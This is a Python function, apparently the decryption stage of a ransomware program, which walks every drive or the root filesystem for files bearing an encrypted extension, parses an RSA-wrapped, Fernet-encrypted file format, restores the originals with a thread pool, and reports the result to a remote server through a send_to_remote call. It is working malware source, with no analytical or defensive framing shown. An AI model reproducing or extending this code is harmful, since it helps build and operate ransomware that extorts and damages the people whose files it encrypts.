def stage3_decrypt(key):
    print('[*] Starting Recovery...')
    PyLog("Stage 3: Manual decryption started.")
    try:
        fernet = Fernet(key.encode('utf-8'))
    except Exception as e:
        print('[!] Invalid key format.')
        return
    targets = []
    if os.path.exists(SCAN_REPORT):
        print(f"[*] Loading targets from {SCAN_REPORT}...")
        try:
            with open(SCAN_REPORT, 'r') as f:
                report = json.load(f)
            for cat in report.get('files_by_category', {}):
                for file_path in report['files_by_category'][cat]:
                    enc_path = file_path if file_path.endswith(ENCRYPTED_EXT) else file_path + ENCRYPTED_EXT
                    if os.path.exists(enc_path):
                        orig_path = enc_path[:-len(ENCRYPTED_EXT)]
                        targets.append((enc_path, orig_path))
        except: pass
    if not targets:
        print(f"[*] {SCAN_REPORT} not found or empty. Searching system for {ENCRYPTED_EXT} files...")
        roots = []
        if platform.system() == 'Windows':
            import string
            for letter in string.ascii_uppercase:
                if letter in ['A', 'B']: continue
                drive = f'{letter}:\\'
                if os.path.exists(drive): roots.append(drive)
        else:
            roots.append('/')
        for r in roots:
            for root, dirs, files in os.walk(r):
                for file in files:
                    if file.endswith(ENCRYPTED_EXT):
                        enc_path = os.path.join(root, file)
                        orig_path = enc_path[:-len(ENCRYPTED_EXT)]
                        targets.append((enc_path, orig_path))
    print(f'[*] Found {len(targets)} files to process.')
    success_count = 0
    total_size = 0
    stats_lock = threading.Lock()
    def decrypt_file_task(target):
        nonlocal success_count, total_size
        enc_path, orig_path = target
        try:
            if not os.path.exists(enc_path):
                return
            with open(enc_path, 'rb') as f:
                header = f.read(4)
                if not header: return
                rsa_len = int.from_bytes(header, 'little')
                if rsa_len < 0 or rsa_len > 10000: # Sanity check: RSA blobs are small
                    return
                f.read(rsa_len) 
                token_len_bytes = f.read(8)
                if not token_len_bytes: return
                token_len = int.from_bytes(token_len_bytes, 'little')
                if token_len < 0 or token_len > 100 * 1024 * 1024: # Sanity check: Max 100MB chunk
                    return
                encrypted_data = f.read(token_len)
                rest = f.read()
            data = fernet.decrypt(encrypted_data)
            with open(orig_path, 'wb') as f:
                f.write(data)
                f.write(rest)
            os.remove(enc_path)
            with stats_lock:
                total_size += len(data)
                success_count += 1
        except:
            pass
    max_workers = min(32, (os.cpu_count() or 1) * 4)
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        list(executor.map(decrypt_file_task, targets))
    total_size_mb = round(total_size / (1024 * 1024), 2)
    print(f'[*] Decrypted {success_count}/{len(targets)} files ({total_size_mb} MB).')
    send_to_remote(status='decrypted', payload_extra={'decrypted_count': str(success_count), 'total_size': f'{total_size_mb} MB'}, attach_files=False)
